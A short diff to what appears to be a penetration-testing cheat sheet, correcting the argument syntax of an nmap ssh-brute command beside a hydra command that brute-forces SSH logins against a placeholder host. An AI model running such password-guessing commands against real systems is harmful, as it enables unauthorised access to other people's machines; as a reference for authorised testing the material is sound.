@@ -3760,7 +3760,7 @@ sudo systemctl disable ssh
 sudo ss -plant | grep ssh
 
 # brute force login
-nmap --script ssh-brute --script-args "userdb=/path/to/user_name_list" --script-args "passdb=/path/to/wordlist" IP_here -p 22
+nmap --script ssh-brute --script-args userdb=/path/to/user_name_list,passdb=/path/to/wordlist IP_here -p 22
 
 hydra -L /path/to/user_name_list -P /path/to/wordlist ssh://IP_here -t 4
 ```
